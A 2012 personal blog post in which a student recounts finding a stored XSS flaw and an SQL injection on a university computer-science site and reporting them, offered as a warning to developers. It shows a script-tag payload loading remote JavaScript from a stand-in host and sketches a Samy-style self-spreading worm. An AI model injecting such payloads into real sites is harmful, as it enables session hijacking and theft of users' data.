+++
title = "How I hacked a site"
date = 2012-08-30T00:58:00Z
updated = 2013-08-23T02:40:42Z
aliases = ["/2012/08/how-i-hacked-site.html"]
tags = ["Programming", "websites", "xss", "Hacking", "sql injection"]
blogimport = true
author = "Ivan du Toit"
authorLink = "https://plus.google.com/109733145121386015159"
+++

I did no harm so don't start booing me before you read the whole story, I just went far enough to prove that in fact there was an exploitable security issue -  and I must admit also showed off to one of my friends by greeting him by name once he logged into the site. I also reported the vulnerabilities to the appropriate people.<br /><h3>How this came about.</h3><div><br /></div>Exam time is a weird time for students, they start experiencing the taste of the holidays while actually performing under the academic pressure of having to pass.<br /><br />In the middle of my exams I was having problems sleeping due to the stress  of the exams. During one of these periods of stress induced insomnia I decided that I would rather be doing something than just lying in bed. So I grabbed my netbook and started to surf the net, at some stage I ended up on the computer science site to check if there was any news related to my course. So there I was 2:30 AM browsing around the site when I had this crazy idea: Is this site secure? I don't know why I had that thought but there it was and since I wasn't sleeping anyway, so I decided to give the site a test.<br /><br />First I had a crack at the user login form but that was hardened against my primitive attacks, but is this true for the whole site or is there some area that the other students before me have not yet checked? So I tried a few of the other forms on the site for <a href="http://en.wikipedia.org/wiki/SQL_injection">SQL injection</a> vulnerabilities but found none but that is to be expected. But what I did find was a <a href="http://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> vulnerability in the member details form. I could inject a script tag that was not escaped into my surname.  But you might say that is not a big deal is it? It seems so innocent to add<br /><div>{{< highlight html >}}&lt;script&gt;alert("Hello World");&lt;/script&gt; &nbsp;{{< /highlight >}}</div>to&nbsp;my surname. But I could also change that to<br /><div><div>{{< highlight html>}}&lt;script src="example.com/evilScript.js"&gt;&lt;/script&gt;{{< /highlight >}}</div></div><br />Which does not look half as cute does it? After some brain storming I thought of ways to infect other users by updating there details in the back ground to include my script in there surname! This infection happens whenever my surname was rendered by the browser! This boys and girls is a worm&nbsp;similar&nbsp;to the<a href="http://en.wikipedia.org/wiki/Samy_(computer_worm)"> myspace worm</a>! So it has gone viral now what?<br /><br />No it can not start the zombie&nbsp;apocalypse&nbsp;(I&nbsp;<strike>think&nbsp;</strike>hope). But it could do all of the following: <br /><ul><li><a href="http://en.wikipedia.org/wiki/Session_hijacking">Session Hijacking</a> </li><li>Steal passwords&nbsp;</li><li>Download other students code for assignments&nbsp;</li><li>Steal other students and lecturer's email address and other hidden personal information.</li><li>Post content as a lecturer or student.</li></ul><div>Pretty scary stuff for suck a innocent vulnerability!</div><div>I also found a SQL injection vulnerability but that to me is not very special because it is very common, yet so easy to prevent that I am just astounded that it exists.<br /><h3>Moral of the story</h3><div><br /></div>So yeah that is how I hacked a site.  I post about the experience both as a warning to other developers and to myself.<br /><ul><li>Innocent looking vulnerabilities can have very grave consequences.</li><li>Your security is only as strong as your weakest point.</li></ul>If this post makes just 1 site more secure I will be very happy. So go code but be safe.</div>
